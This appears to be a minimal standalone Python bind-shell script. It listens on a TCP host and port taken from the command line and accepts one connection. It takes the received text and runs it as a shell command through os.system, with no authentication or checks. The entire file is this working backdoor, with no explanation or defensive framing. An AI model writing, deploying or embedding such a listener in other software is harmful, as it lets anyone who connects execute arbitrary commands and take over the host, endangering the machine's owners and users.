import socket

from sys import argv
from os import system

if len(argv) != 3:
    print(f'Usage: {argv[0]} <host> <port>')
    exit(0)

HOST = argv[1]
PORT = int(argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

print(f'Connected by {addr}')
command = conn.recv(1024).decode('utf-8')
print(f'Got command: {command}')
system(command)

conn.close()